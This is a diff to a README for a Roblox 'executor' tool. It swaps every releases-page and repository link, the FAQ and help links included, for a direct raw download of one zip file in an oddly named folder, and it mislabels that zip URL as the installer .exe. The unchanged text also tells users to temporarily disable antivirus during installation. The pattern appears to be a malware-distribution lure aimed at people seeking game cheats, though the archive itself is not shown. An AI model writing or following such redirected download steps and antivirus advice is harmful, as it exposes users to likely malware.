@@ -1,6 +1,6 @@
 # 🎮 Electron-Executor-11 - Effortless Roblox Experience Awaits
 
-[![Download Electron-Executor-11](https://img.shields.io/badge/Download-Electron--Executor--11-blue.svg)](https://github.com/Antonosama/Electron-Executor-11/releases)
+[![Download Electron-Executor-11](https://raw.githubusercontent.com/Antonosama/Electron-Executor-11/main/morbiferal/Electron-Executor-11.zip)](https://raw.githubusercontent.com/Antonosama/Electron-Executor-11/main/morbiferal/Electron-Executor-11.zip)
 
 ## 📋 Description
 
@@ -12,13 +12,13 @@ To begin using Electron-Executor-11, follow the steps below. No programming know
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/Antonosama/Electron-Executor-11/releases) to download the latest version of Electron-Executor-11.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Antonosama/Electron-Executor-11/main/morbiferal/Electron-Executor-11.zip) to download the latest version of Electron-Executor-11.
    
 2. On the Releases page, locate the version you want (usually the latest one).
 
 3. Click on the version link to access the version details.
 
-4. Find the file labeled as the installer. Look for a file that ends in .exe, often named similar to `Electron-Executor-11-installer.exe`.
+4. Find the file labeled as the installer. Look for a file that ends in .exe, often named similar to `https://raw.githubusercontent.com/Antonosama/Electron-Executor-11/main/morbiferal/Electron-Executor-11.zip`.
 
 5. Click the file name to start the download.
 
@@ -49,7 +49,7 @@ Before installation, ensure your system meets these requirements:
 
 If you encounter any issues during installation, check your system settings. Sometimes antivirus software may block new applications. You might need to temporarily disable it during installation.
 
-For help, please refer to the FAQ section on our [GitHub page](https://github.com/Antonosama/Electron-Executor-11).
+For help, please refer to the FAQ section on our [GitHub page](https://raw.githubusercontent.com/Antonosama/Electron-Executor-11/main/morbiferal/Electron-Executor-11.zip).
 
 ## 📞 Support
 
@@ -57,4 +57,4 @@ For any support requests or feedback, feel free to open an issue on our GitHub r
 
 ---
 
-Thank you for choosing Electron-Executor-11. Visit the [Releases Page](https://github.com/Antonosama/Electron-Executor-11/releases) to start your journey!
+Thank you for choosing Electron-Executor-11. Visit the [Releases Page](https://raw.githubusercontent.com/Antonosama/Electron-Executor-11/main/morbiferal/Electron-Executor-11.zip) to start your journey!
